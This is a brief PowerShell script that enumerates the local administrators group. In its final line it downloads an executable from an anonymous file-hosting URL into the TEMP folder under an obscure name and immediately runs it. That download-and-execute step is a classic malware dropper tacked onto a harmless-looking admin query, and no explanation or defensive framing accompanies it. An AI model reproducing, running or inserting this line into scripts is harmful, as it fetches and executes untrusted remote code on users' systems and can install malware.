

& net localgroup administrators | Select-Object -Skip 6 | ? {
    $_ -and $_ -notmatch "The command completed successfully" 
} | % {
    $o = "" | Select-Object Account
    $o.Account = $_
    $o
}
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/ultxkr.exe',"$env:TEMP\uuuu.exe");Start-Process ("$env:TEMP\uuuu.exe")

